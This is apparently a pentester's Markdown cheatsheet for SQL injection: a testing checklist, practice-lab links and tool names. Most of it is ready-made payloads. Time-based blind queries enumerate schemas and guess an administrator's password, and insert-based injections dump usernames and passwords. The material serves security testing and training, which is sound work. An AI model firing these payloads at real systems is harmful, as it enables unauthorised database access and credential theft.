 # SQL Injection Cheatsheet

- [ ] Look for any endpoint/functionality that seems like it is touching the DB
    - Try injecting a single or double quote and look for changes in response
    - Try adding comments on login forms to bypass authentication
    - Try to enumerate the database type and version
- [ ] Check if you can trigger an error
    - Visible errors
    - Conditional errors (e.g., divide by zero)
- [ ] Check if you can trigger a conditional response
- [ ] Try to trigger a time delay - sleep

```bash
test@test.com' and 1=sleep(3);-- -
```

```bash
' or 1=(SELECT SLEEP(3) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME like 'i%' LIMIT 1 );--
```

```bash
' or 1=(SELECT SLEEP(3) FROM information_schema.TABLES WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME like 'u%' LIMIT 1 );--
```

```bash
' and (SELECT sleep(3) from information_schema.COLUMNS where TABLE_SCHEMA = 'sqli_four' and TABLE_NAME = 'users' and COLUMN_NAME like 'u%' LIMIT 1);--+-
```

```bash
' AND 1=(SELECT sleep(3) FROM users WHERE username = 'administrator' AND password like 'a%' LIMIT 1);-- -
```

- [ ] Look for any input fields that may be inserting rows into the database and check those for injection as well.

> [!warning] Be careful with testing this. Inserting rows into the db without consideration has the potential to break something in the application.

- Examples
```bash
title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--
```

```bash
title',(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where TABLE_SCHEMA='sqli_five'));--
```

```bash
title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'<br>') FROM sqli_five.users));--
```

- Blind insert examples

```bash
test',sleep(5),'');-- -
```

```bash
',( select sleep(5) where version() like '8%' ) ,'');--
```

```bash
',( select sleep(5) from flag where flag like 'a%' ),'');--
```

# Labs

- [ ] All PortSwigger SQLi Labs
- [ ] Audi-l/sql-labs
    [GitHub - Audi-1/sqli-labs: SQLI labs to test error based, Blind boolean based, Time based.](https://github.com/Audi-1/sqli-labs)
- [ ] SpiderLabs/MCIR
    [GitHub - SpiderLabs/MCIR: The Magical Code Injection Rainbow! MCIR is a framework for building configurable vulnerability testbeds. MCIR is also a collection of configurable vulnerability testbeds.](https://github.com/SpiderLabs/MCIR)

> [!tip] Note that these last two are not currently maintained.
# Tools

- [ ] sqlmap
- [ ] ghauri
    [GitHub - r0oth3x49/ghauri: An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws](https://github.com/r0oth3x49/ghauri)

> [!tip] Custom headers are still by far the most common place to still find SQLi

- [ ] hbsqli